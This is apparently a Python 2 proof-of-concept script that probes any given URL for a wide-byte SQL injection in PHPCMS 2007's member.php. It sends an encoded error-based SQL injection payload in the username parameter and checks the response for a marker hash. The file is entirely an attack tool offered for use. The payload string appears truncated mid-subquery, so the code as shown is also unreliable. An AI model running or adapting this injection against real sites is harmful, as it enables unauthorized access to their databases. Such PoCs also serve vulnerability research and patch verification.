#encoding=UTF-8
__author__ = 'greenboy'
#!/usr/bin/env python
# coding=utf-8
import sys
import requests
def scan(target):
    info = {
    'name':u'PHPCMS 2007 member.php宽字节注入',
    'date':'2014-11-30',
    'author':'5up3rc',
    'poc': '/member/member.php?username=%d5%27%2B%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C'
    }
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    audit_request = requests.get(target + info['poc'], headers=headers)
    audit_request.close()
    if audit_request.status_code == 200:
        if audit_request.text.find('63e1f04640e83605c1d177544a5a0488') != -1:
            print u'[!]audit success'
            print '[*]' + target + info['poc']
        else:
            print u'[!]audit error'
    else:
        print 'connection error'
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "Usage: python phpcms_member_php_sqli.py [target]\n"
        print "Example: python phpcms_member_php_sqli.py  http://www.xxx.com\n"
        sys.exit(1)
    else:
        target = sys.argv[1].lower()
    scan(target)
